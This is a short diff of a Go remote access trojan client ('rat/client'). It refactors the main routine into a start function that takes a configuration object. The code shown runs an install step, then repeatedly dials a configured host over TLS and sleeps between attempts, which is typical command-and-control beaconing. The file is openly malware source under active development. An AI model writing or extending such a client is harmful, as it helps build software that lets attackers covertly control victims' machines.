@@ -4,6 +4,7 @@ import (
 	"crypto/tls"
 	"fmt"
 	"rat/client/startup"
+	"rat/common"
 	"time"
 )
 
@@ -19,8 +20,12 @@ func main() {
 		fmt.Println("Install failed:", err.Error())
 	}
 
+	start(Config)
+}
+
+func start(config common.BinaryConfig) {
 	for {
-		host := Config.Host
+		host := config.Host
 		fmt.Println("Connecting to", host)
 
 		conn, err := tls.Dial("tcp", host, &tls.Config{
@@ -69,6 +74,6 @@ func main() {
 
 	end:
 
-		time.Sleep(time.Second * time.Duration(Config.Delay))
+		time.Sleep(time.Second * time.Duration(config.Delay))
 	}
 }
